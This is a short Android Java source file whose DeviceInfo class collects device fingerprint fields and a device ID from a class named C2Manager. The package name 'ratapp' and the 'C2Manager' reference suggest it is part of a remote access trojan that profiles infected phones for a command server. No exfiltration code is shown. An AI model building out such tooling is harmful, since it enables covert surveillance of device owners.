package com.ratio.ratapp;

import android.content.Context;
import android.os.Build;

import java.util.HashMap;
import java.util.Map;

public class DeviceInfo {
    public static Map<String, Object> snapshot(Context ctx) {
        Map<String, Object> m = new HashMap<>();
        m.put("model", Build.MODEL);
        m.put("manufacturer", Build.MANUFACTURER);
        m.put("brand", Build.BRAND);
        m.put("version", Build.VERSION.RELEASE);
        m.put("sdk", Build.VERSION.SDK_INT);
        m.put("hardware", Build.HARDWARE);
        m.put("board", Build.BOARD);
        m.put("product", Build.PRODUCT);
        m.put("deviceId", C2Manager.getDeviceId(ctx));
        return m;
    }
}
